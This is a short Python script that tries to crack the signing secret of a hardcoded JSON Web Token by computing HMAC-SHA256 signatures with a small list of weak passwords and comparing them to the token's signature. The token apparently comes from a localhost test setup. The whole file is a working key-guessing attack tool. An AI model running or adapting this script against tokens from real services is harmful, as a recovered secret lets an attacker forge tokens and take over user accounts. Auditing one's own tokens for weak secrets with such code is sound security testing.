import base64
import hmac
import hashlib
import jwt

# Define the weak key list
keys = ["123456", "password", "letmein", "weak_key", "adminkey"]  # Add more common weak keys

# The JWT token you want to crack
jwt_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb2NhbGhvc3QiLCJpYXQiOjE3MzY1MDQyMjgsImV4cCI6MTczNjUwNzgyOCwidXNlcl9pZCI6NzAsInVzZXJuYW1lIjoiaWRoYW0ifQ.riw0pO8YMJQoM3LfBigEf4yf2XNElxAmM1dO610sXEc"

# Split the JWT token into three parts (header, payload, signature)
header, payload, signature = jwt_token.split(".")

# Base64 URL decode the header and payload
header_json = base64.urlsafe_b64decode(header + "==")  # Add padding to make it valid base64
payload_json = base64.urlsafe_b64decode(payload + "==")

# Print out the decoded header and payload (for debugging)
print(f"Decoded Header: {header_json.decode()}")
print(f"Decoded Payload: {payload_json.decode()}")

# Try each key in the list
for key in keys:
    print(f"Trying key: {key}")  # Debugging line to show the current key being tested
    
    # Manually verify the signature using HMAC with SHA-256
    message = f"{header}.{payload}"
    expected_signature = base64.urlsafe_b64encode(
        hmac.new(key.encode(), message.encode(), hashlib.sha256).digest()
    ).decode().rstrip("=")  # Remove any padding

    # Check if the generated signature matches the one in the JWT
    if signature == expected_signature:
        print(f"Success! Key: {key} - Decoded JWT: {payload_json.decode()}")
        break  # Stop when we find the correct key
    else:
        print(f"Failed with key: {key}")  # Show failure for each guess

